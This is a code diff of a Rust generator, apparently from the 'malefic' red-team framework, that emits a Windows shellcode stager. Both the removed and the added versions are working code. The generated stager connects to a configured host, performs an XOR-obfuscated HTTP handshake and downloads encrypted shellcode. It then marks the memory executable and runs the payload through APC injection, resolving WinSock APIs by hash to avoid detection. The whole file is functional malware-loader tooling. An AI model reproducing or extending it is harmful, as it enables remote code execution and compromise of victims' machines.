@@ -1,391 +1,326 @@
-use super::{
-    djb2_hash,
-    utils::{
-        generate_dll_name_asm, generate_string_asm_instructions, TARGET_SOURCE_PATH,
-        X64_MAIN_TEMPLATE_PATH, X64_MAKE_BODY, X86_MAIN_TEMPLATE_PATH, X86_MAKE_BODY,
-    },
-    PANIC,
-};
+use super::utils::{djb2_hash, INSTANCE_TEMPLATE_PATH, TARGET_INSTANCE_PATH};
 use crate::config::{GenerateArch, PulseConfig, Version};
-
-static X64_DEPENDENCIES: &str = "
-use malefic_win_kit::asm::arch::x64::{
-    crypto::xor_process,
-    apc::inline_apc_loader, 
-    http::make_http, 
-    memory::{
-        _convert_lebytes_to_u32, 
-        _memcpy, 
-        _memset, 
-        _virtual_alloc
-    }, 
-    str::boyer_moore_search, 
-    tcp::{
-        bind_and_connect, 
-        send_std, 
-        recv_std
-        }
-    };
-";
-
-static X86_DEPENDENCIES: &str = "
-use malefic_win_kit::asm::arch::x86::{
-    crypto::xor_process,
-    apc::inline_apc_loader, 
-    http::make_http, 
-    memory::{
-        _convert_lebytes_to_u32, 
-        _memcpy, 
-        _memset, 
-        _virtual_alloc
-    }, 
-    str::boyer_moore_search, 
-    tcp::{
-        bind_and_connect, 
-        send_std, 
-        recv_std
-        }
-    };
-";
-
-static PREBUILD_DEPENDENCIES: &str = r#"
-#[link(name = "malefic_win_kit_pulse", kind = "static")]
-extern "C" {
-    pub fn bind_and_connect(
-        dll_name: *const u8, 
-        ip: *const u8, 
-        port: u16
-    ) -> usize;
-    pub fn send_std(
-        socket: usize,
-        buf: usize,
-        len: usize 
-    ) -> usize;
-    pub fn recv_std(
-        socket: usize,
-        buf: usize,
-        len: usize,
-    ) -> usize;
-    pub fn xor_process(
-        data: *mut u8, 
-        data_len: usize, 
-        key: *const u8, 
-        key_len: usize, 
-        iv: *const u8, 
-        iv_len: usize, 
-        counter: *mut usize
-    );
-    pub fn _virtual_alloc(
-        _address: *mut u8,
-        _size: usize,
-        _alloc_type: u32,
-        _protect: u32
-    ) -> *mut u8;
-    pub fn _memcpy(
-        _dst: *mut u8,
-        _src: *const u8,
-        _size: usize,
-    );
-    pub fn _memset(
-        _dst: *mut u8,
-        _value: u8,
-        _size: usize,
-    );
-    pub fn _convert_lebytes_to_u32(
-        _bytes: *const u8,
-    ) -> u32;
-    pub fn inline_apc_loader(bin: usize, len: usize) -> usize;
-    pub fn make_http(
-        header: *const u8,
-        header_len: usize,
-        body: *const u8,
-        body_len: usize,
-        buf: *mut u8,
-        buf_len: usize,
-    );
-    pub fn boyer_moore_search(
-        text: *const u8,
-        text_len: usize,
-        pattern: *const u8,
-        pattern_len: usize,
-    ) -> isize;
-}
-"#;
 
 pub fn generate_http_pulse(
     config: PulseConfig,
-    arch: GenerateArch,
-    version: &Version,
-    source: bool,
-) -> anyhow::Result<()> {
-    generate_pulse_template(config, arch, version, source)
-}
-
-fn generate_pulse_template(
-    config: PulseConfig,
-    arch: GenerateArch,
-    version: &Version,
-    source: bool,
-) -> anyhow::Result<()> {
-    let mut dependencies = PREBUILD_DEPENDENCIES;
-    let main_template_path;
-    let make_body;
-    match arch {
-        GenerateArch::X64 => {
-            if source {
-                dependencies = X64_DEPENDENCIES;
-            }
-            main_template_path = X64_MAIN_TEMPLATE_PATH;
-            make_body = X64_MAKE_BODY;
-        }
-        GenerateArch::X86 => {
-            if source {
-                dependencies = X86_DEPENDENCIES;
-            }
-            main_template_path = X86_MAIN_TEMPLATE_PATH;
-            make_body = X86_MAKE_BODY;
-        } // _ => {
-          //     anyhow::bail!("Unsupported arch.");
-          // }
-    }
-
-    make_source_code(
-        config,
-        main_template_path,
-        dependencies,
-        TARGET_SOURCE_PATH,
-        make_body,
-        version,
-        source,
-    )
-}
-
-fn make_source_code(
-    config: PulseConfig,
-    main_template_path: &str,
-    dependencies: &str,
-    _target_source_path: &str,
-    make_body: &str,
+    _arch: GenerateArch,
     _version: &Version,
-    source: bool,
+    _source: bool,
 ) -> anyhow::Result<()> {
-    let main_template_path = std::path::Path::new(main_template_path);
-    if !main_template_path.exists() {
-        anyhow::bail!("main_template_path does not exist.");
+    let template_path = std::path::Path::new(INSTANCE_TEMPLATE_PATH);
+    if !template_path.exists() {
+        anyhow::bail!("Instance template not found: {}", INSTANCE_TEMPLATE_PATH);
     }
-    let main_template = std::fs::read_to_string(main_template_path)?;
-    let mut final_data = format!("{}\n\n\n{}\n", main_template, dependencies);
+    let template = std::fs::read_to_string(template_path)?;
 
-    if !source {
-        final_data = format!("{}\n\n\n{}\n", final_data, PANIC);
-    }
-
-    final_data = format!("{}\n\n\n{}", final_data, make_body);
     let url = &config.target;
     if url.is_empty() {
-        anyhow::bail!("url is empty.");
+        anyhow::bail!("target url is empty.");
     }
-    let (ip, port) = url.split_at(url.find(":").unwrap());
+    let colon_pos = url
+        .find(':')
+        .ok_or_else(|| anyhow::anyhow!("invalid target format, expected ip:port"))?;
+    let (ip, port_str) = url.split_at(colon_pos);
+    let port: u16 = port_str[1..].parse()?;
+
     let mut http_header = config.http.build(10);
     http_header.push_str("\\r\\n");
+
     let magic = djb2_hash(&config.flags.magic);
     let key = &config.key;
-    let iv = key.chars().rev().collect::<String>();
+    let iv: String = key.chars().rev().collect();
 
-    let ip_with_null = format!("{}\0", ip);
-    let ip_asm_instructions = generate_string_asm_instructions(&ip_with_null, "ip");
-    let key_asm_instructions = generate_string_asm_instructions(key, "k1");
-    let iv_asm_instructions = generate_string_asm_instructions(&iv, "k2");
-    let dll_asm_instructions = generate_dll_name_asm();
+    let key_bytes = format_byte_literals(key.as_bytes());
+    let iv_bytes = format_byte_literals(iv.as_bytes());
+    let ip_bytes = format_byte_literals(ip.as_bytes());
+    let header_bytes = format_byte_literals(http_header.as_bytes());
 
-    let main_content = format!(
-        r#"
-#[no_mangle]
-fn fire() {{
-    let start = {start}u8;
-    let end = {end}u8;
-    let magic = {magic}u32;
-    let header = b"{http_header}";
-    unsafe {{
-        let mut buf: [u8;0x100] =
-            core::mem::MaybeUninit::uninit().assume_init();
-        let mut body_buf: [u8;10] =
-            core::mem::MaybeUninit::uninit().assume_init();
-        _memset(buf.as_mut_ptr(), 0, 0x100);
-        _memset(body_buf.as_mut_ptr(), 0, 10);
+    let start_method = format!(
+        r#"    pub unsafe fn start(&self, _args: *mut c_void) {{
+        fn xor_process(data: &mut [u8], key: &[u8], iv: &[u8], counter: &mut usize) {{
+            for byte in data.iter_mut() {{
+                *byte ^= key[*counter % key.len()] ^ iv[*counter % iv.len()];
+                *counter += 1;
+            }}
+        }}
 
-        // Use inline assembly to construct strings - compiler cannot optimize this
-        let mut dll_name = [0u8; 11];
-        let mut target_ip = [0u8; {ip_len}];
-        let mut key1 = [0u8; {key_len}];
-        let mut key2 = [0u8; {iv_len}];
+        fn find_crlf2(buf: &[u8], len: usize) -> isize {{
+            if len < 4 {{ return -1; }}
+            let mut i = 0usize;
+            while i <= len - 4 {{
+                if buf[i] == b'\r' && buf[i+1] == b'\n'
+                    && buf[i+2] == b'\r' && buf[i+3] == b'\n' {{
+                    return i as isize;
+                }}
+                i += 1;
+            }}
+            -1
+        }}
 
-        core::arch::asm!(
-            // Construct "ws2_32.dll\0"
-            {dll_asm_instructions}
+        fn make_http_request(
+            header: &[u8], body: &[u8], out: &mut [u8],
+        ) -> usize {{
+            let mut pos = 0usize;
+            for &b in header.iter() {{
+                if pos >= out.len() {{ break; }}
+                out[pos] = b;
+                pos += 1;
+            }}
+            for &b in body.iter() {{
+                if pos >= out.len() {{ break; }}
+                out[pos] = b;
+                pos += 1;
+            }}
+            pos
+        }}
 
-            // Construct IP address with null terminator
-            {ip_asm_instructions}
+        // Load ws2_32.dll
+        let dll_name: [u8; 11] = [b'w', b's', b'2', b'_', b'3', b'2', b'.', b'd', b'l', b'l', 0];
+        let load_lib: FnLoadLibraryA = core::mem::transmute(self.kernel32.LoadLibraryA);
+        let ws2 = load_lib(dll_name.as_ptr() as *mut u8);
+        if ws2.is_null() {{ return; }}
+        let ws2_base = ws2 as usize;
 
-            // Construct encryption keys
-            {key_asm_instructions}
-            {iv_asm_instructions}
+        // Resolve WinSock APIs via hash
+        let wsa_startup: FnWSAStartup = core::mem::transmute(
+            resolve::_api(ws2_base, hash_str!("WSAStartup") as usize));
+        let p_socket: FnSocket = core::mem::transmute(
+            resolve::_api(ws2_base, hash_str!("socket") as usize));
+        let p_connect: FnConnect = core::mem::transmute(
+            resolve::_api(ws2_base, hash_str!("connect") as usize));
+        let p_send: FnSend = core::mem::transmute(
+            resolve::_api(ws2_base, hash_str!("send") as usize));
+        let p_recv: FnRecv = core::mem::transmute(
+            resolve::_api(ws2_base, hash_str!("recv") as usize));
+        let p_closesocket: FnClosesocket = core::mem::transmute(
+            resolve::_api(ws2_base, hash_str!("closesocket") as usize));
+        let p_inet_addr: FnInetAddr = core::mem::transmute(
+            resolve::_api(ws2_base, hash_str!("inet_addr") as usize));
+        let p_htons: FnHtons = core::mem::transmute(
+            resolve::_api(ws2_base, hash_str!("htons") as usize));
 
-            dll = in(reg) dll_name.as_mut_ptr(),
-            ip = in(reg) target_ip.as_mut_ptr(),
-            k1 = in(reg) key1.as_mut_ptr(),
-            k2 = in(reg) key2.as_mut_ptr(),
-            options(nostack, preserves_flags)
-        );
+        // WSAStartup
+        let mut wsa_data: WSADATA = core::mem::zeroed();
+        if wsa_startup(0x0202, &mut wsa_data) != 0 {{ return; }}
 
-        let socket = bind_and_connect(
-            dll_name.as_ptr(),
-            target_ip.as_ptr(),
-            {port}
-        );
-        if socket.eq(&0) {{
+        // Create socket
+        let sock = p_socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+        if sock == 0 || sock == usize::MAX {{ return; }}
+
+        // Connect
+        let ip_addr: [u8; {ip_len}] = [{ip_bytes}, 0];
+        let addr = SOCKADDR_IN {{
+            sin_family: AF_INET as i16,
+            sin_port: p_htons({port}),
+            sin_addr: IN_ADDR {{ s_addr: p_inet_addr(ip_addr.as_ptr()) }},
+            sin_zero: [0; 8],
+        }};
+        if p_connect(sock, &addr, core::mem::size_of::<SOCKADDR_IN>() as i32) != 0 {{
+            p_closesocket(sock);
             return;
         }}
-        make_body(body_buf.as_mut_ptr(), start, end, magic, {artifact_id});
+
+        // Configuration
+        let key: [u8; {key_len}] = [{key_bytes}];
+        let iv: [u8; {iv_len}] = [{iv_bytes}];
+        let header: [u8; {header_len}] = [{header_bytes}];
+
+        // Build handshake body: [start][magic:4][artifact_id:4][end]
+        let mut body: [u8; 10] = [0; 10];
+        body[0] = {start}u8;
+        let m = {magic}u32.to_le_bytes();
+        body[1] = m[0]; body[2] = m[1]; body[3] = m[2]; body[4] = m[3];
+        let a = {artifact_id}u32.to_le_bytes();
+        body[5] = a[0]; body[6] = a[1]; body[7] = a[2]; body[8] = a[3];
+        body[9] = {end}u8;
+
+        // Encrypt body
         let mut counter: usize = 0;
-        xor_process(
-            body_buf.as_mut_ptr(),
-            10,
-            key1.as_ptr(),
-            {key_len},
-            key2.as_ptr(),
-            {iv_len},
-            &mut counter
-        );
-        make_http(
-            header.as_ptr(), 
-            header.len(), 
-            body_buf.as_mut_ptr(), 
-            10, 
-            buf.as_mut_ptr(), 
-            0x100);
-        let ret = send_std(socket, buf.as_ptr() as _, 0x100);
-        if ret.eq(&0) {{
-            return;
-        }}
-        let split_marker = b"\r\n\r\n";
-        _memset(buf.as_mut_ptr(), 0, 0x100);
+        xor_process(&mut body, &key, &iv, &mut counter);
+
+        // Build HTTP request: header + body
+        let mut buf: [u8; 0x100] = [0; 0x100];
+        let req_len = make_http_request(&header, &body, &mut buf);
+
+        // Send HTTP request
+        let ret = p_send(sock, buf.as_ptr(), req_len as i32, 0);
+        if ret <= 0 {{ p_closesocket(sock); return; }}
+
+        // Receive HTTP response and find body
+        let mut recv_buf: [u8; 0x100] = [0; 0x100];
         let mut body_offset: isize = -1;
-        let mut offset: usize = 0;
+        let mut total_recv = 0usize;
 
         loop {{
-            let ret = recv_std(
-                socket,
-                buf.as_ptr().add(0x4) as usize,
-                0x100 - 0x4
+            let space = if total_recv < 4 {{ 0 }} else {{ total_recv - 4 }};
+            let ret = p_recv(
+                sock,
+                recv_buf.as_mut_ptr().add(total_recv),
+                (0x100 - total_recv) as i32,
+                0,
             );
-            if ret.eq(&0) || ret.eq(&0xffffffff) {{
-                return;
-            }}
-            offset += ret as usize + 4;
-            body_offset = boyer_moore_search(
-                buf.as_mut_ptr(),
-                0x100,
-                split_marker.as_ptr(),
-                split_marker.len()
+            if ret <= 0 {{ p_closesocket(sock); return; }}
+            total_recv += ret as usize;
+
+            body_offset = find_crlf2(
+                &recv_buf[space..total_recv],
+                total_recv - space,
             );
-            if body_offset.ne(&-1) {{
+            if body_offset >= 0 {{
+                body_offset += space as isize;
                 break;
             }}
-            _memset(buf.as_mut_ptr(), 0, 0x100 - 0x4);
-            if offset.eq(&0x100) {{
-                _memcpy(buf.as_mut_ptr(), buf.as_ptr().add(ret as usize), 4);
+            if total_recv >= 0x100 {{ p_closesocket(sock); return; }}
+        }}
+
+        let body_start = (body_offset as usize) + 4;
+
+        // Read response body (9 bytes header)
+        let mut resp_body: [u8; 9] = [0; 9];
+        let available = if body_start < total_recv {{ total_recv - body_start }} else {{ 0 }};
+        if available >= 9 {{
+            let mut i = 0usize;
+            while i < 9 {{
+                resp_body[i] = recv_buf[body_start + i];
+                i += 1;
+            }}
+        }} else {{
+            let mut i = 0usize;
+            while i < available {{
+                resp_body[i] = recv_buf[body_start + i];
+                i += 1;
+            }}
+            let mut offset = available;
+            while offset < 9 {{
+                let ret = p_recv(
+                    sock,
+                    resp_body.as_mut_ptr().add(offset),
+                    (9 - offset) as i32,
+                    0,
+                );
+                if ret <= 0 {{ p_closesocket(sock); return; }}
+                offset += ret as usize;
             }}
         }}
 
-        _memset(body_buf.as_mut_ptr(), 0, 10);
-        let body_offset = 4 + body_offset as usize;
-        if (body_offset + 9).le(&offset) {{
-            _memcpy(body_buf.as_mut_ptr(), buf.as_ptr().add(body_offset), 9);
-        }} else {{
-            let left_data = body_offset + 9 - offset;
-            let additional_ret = recv_std(
-                socket, 
-                body_buf.as_mut_ptr() as _, 
-                left_data);
-            if additional_ret.eq(&0) || additional_ret.eq(&0xffffffff) {{
-                return;
-            }}
-        }}
+        // Decrypt and validate response
         counter = 0;
-        xor_process(
-            body_buf.as_mut_ptr(),
-            9,
-            key1.as_ptr(),
-            {key_len},
-            key2.as_ptr(),
-            {iv_len},
-            &mut counter
+        xor_process(&mut resp_body, &key, &iv, &mut counter);
+        if resp_body[0] != {start}u8 {{ p_closesocket(sock); return; }}
+        let recv_magic = u32::from_le_bytes([resp_body[1], resp_body[2], resp_body[3], resp_body[4]]);
+        let recv_len = u32::from_le_bytes([resp_body[5], resp_body[6], resp_body[7], resp_body[8]]);
+        if recv_magic != {magic}u32 || recv_len == 0 {{ p_closesocket(sock); return; }}
+
+        // Allocate memory for shellcode
+        let mut base_addr: PVOID = core::ptr::null_mut();
+        let mut region_size: SIZE_T = recv_len as usize + 1;
+        let nt_alloc: FnNtAllocateVirtualMemory =
+            core::mem::transmute(self.ntdll.NtAllocateVirtualMemory);
+        let status = nt_alloc(
+            -1isize as HANDLE, &mut base_addr, 0, &mut region_size,
+            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE,
         );
-        if body_buf[0].ne(&start) {{
+        if status != STATUS_SUCCESS || base_addr.is_null() {{
+            p_closesocket(sock);
             return;
         }}
-        let recv_magic = _convert_lebytes_to_u32(body_buf.as_ptr().add(1));
-        let recv_len = _convert_lebytes_to_u32(body_buf.as_ptr().add(5));
-        if recv_magic.ne(&magic) || recv_len.eq(&0) {{
-            return;
-        }}
-        let ptr = _virtual_alloc(0 as _, recv_len as _, 0x1000, 0x4);
-        if ptr.is_null() {{
-            return;
-        }}
-        let mut shellcode_len = 0;
-        if body_offset + 9 <= offset {{
-            shellcode_len = offset - body_offset - 9;
-        }}
-        if shellcode_len > 0 {{
-            _memcpy(
-                ptr as _, 
-                buf.as_ptr().add(body_offset + 9), 
-                shellcode_len
+
+        // Copy any shellcode data already received after the 9-byte header
+        let shellcode_start = body_start + 9;
+        let mut shellcode_recv = 0usize;
+        if shellcode_start < total_recv {{
+            shellcode_recv = total_recv - shellcode_start;
+            crate::memory::copy(
+                base_addr as *mut u8,
+                recv_buf.as_ptr().add(shellcode_start),
+                shellcode_recv as u32,
             );
         }}
-        while shellcode_len < recv_len as usize {{
-            let ret = recv_std(
-                socket, 
-                ptr as usize + shellcode_len, 
-                recv_len as usize - shellcode_len
+
+        // Receive remaining shellcode
+        while shellcode_recv < recv_len as usize {{
+            let ret = p_recv(
+                sock,
+                (base_addr as *mut u8).add(shellcode_recv),
+                (recv_len as usize - shellcode_recv) as i32,
+                0,
             );
-            if ret == 0 || ret == 0xffffffff {{
-                return;
-            }}
-            shellcode_len += ret as usize;
+            if ret <= 0 {{ p_closesocket(sock); return; }}
+            shellcode_recv += ret as usize;
         }}
+        p_closesocket(sock);
+
+        // Decrypt shellcode
         xor_process(
-            ptr as _,
-            shellcode_len as _,
-            key1.as_ptr(),
-            {key_len},
-            key2.as_ptr(),
-            {iv_len},
-            &mut counter
+            core::slice::from_raw_parts_mut(base_addr as *mut u8, recv_len as usize),
+            &key, &iv, &mut counter,
         );
-        inline_apc_loader(ptr as _, shellcode_len);
-    }}
-}}
-        "#,
+
+        // Change memory protection to executable
+        let mut old_protect: ULONG = 0;
+        let mut protect_base = base_addr;
+        let mut protect_size = region_size;
+        let nt_protect: FnNtProtectVirtualMemory =
+            core::mem::transmute(self.ntdll.NtProtectVirtualMemory);
+        nt_protect(
+            -1isize as HANDLE, &mut protect_base, &mut protect_size,
+            PAGE_EXECUTE_READ, &mut old_protect,
+        );
+
+        // Execute shellcode via APC injection
+        let nt_create: FnNtCreateThreadEx =
+            core::mem::transmute(self.ntdll.NtCreateThreadEx);
+        let nt_queue: FnNtQueueApcThread =
+            core::mem::transmute(self.ntdll.NtQueueApcThread);
+        let nt_resume: FnNtAlertResumeThread =
+            core::mem::transmute(self.ntdll.NtAlertResumeThread);
+        let nt_wait: FnNtWaitForSingleObject =
+            core::mem::transmute(self.ntdll.NtWaitForSingleObject);
+
+        let mut thread_handle: HANDLE = core::ptr::null_mut();
+        nt_create(
+            &mut thread_handle, 0x1FFFFF, core::ptr::null_mut(),
+            -1isize as HANDLE, base_addr, core::ptr::null_mut(),
+            THREAD_CREATE_FLAGS_CREATE_SUSPENDED,
+            0, 0, 0, core::ptr::null_mut(),
+        );
+        if thread_handle.is_null() {{ return; }}
+
+        nt_queue(
+            thread_handle, base_addr,
+            core::ptr::null_mut(), core::ptr::null_mut(), core::ptr::null_mut(),
+        );
+
+        let mut suspend_count: ULONG = 0;
+        nt_resume(thread_handle, &mut suspend_count);
+        nt_wait(thread_handle, 0, core::ptr::null_mut());
+    }}"#,
+        ip_len = ip.len() + 1,
+        ip_bytes = ip_bytes,
+        port = port,
+        key_len = key.len(),
+        key_bytes = key_bytes,
+        iv_len = iv.len(),
+        iv_bytes = iv_bytes,
+        header_len = http_header.len(),
+        header_bytes = header_bytes,
         start = config.flags.start,
         end = config.flags.end,
-        magic = format!("0x{:x}", magic as u32),
+        magic = format!("0x{:08x}", magic),
         artifact_id = config.flags.artifact_id,
-        port = port[1..].parse::<u16>()?,
-        ip_len = ip_with_null.len(),
-        key_len = key.len(),
-        iv_len = iv.len(),
-        http_header = http_header,
-        dll_asm_instructions = dll_asm_instructions,
-        ip_asm_instructions = ip_asm_instructions,
-        key_asm_instructions = key_asm_instructions,
-        iv_asm_instructions = iv_asm_instructions,
     );
-    final_data = format!("{}\n\n\n{}", final_data, main_content);
-    let target_path = std::path::Path::new(TARGET_SOURCE_PATH);
-    std::fs::write(target_path, final_data)?;
+
+    let instance_rs = format!("{}\n{}\n}}\n", template, start_method);
+    let target_path = std::path::Path::new(TARGET_INSTANCE_PATH);
+    std::fs::write(target_path, instance_rs)?;
 
     Ok(())
+}
+
+fn format_byte_literals(bytes: &[u8]) -> String {
+    bytes
+        .iter()
+        .map(|b| format!("0x{:02x}", b))
+        .collect::<Vec<_>>()
+        .join(", ")
 }
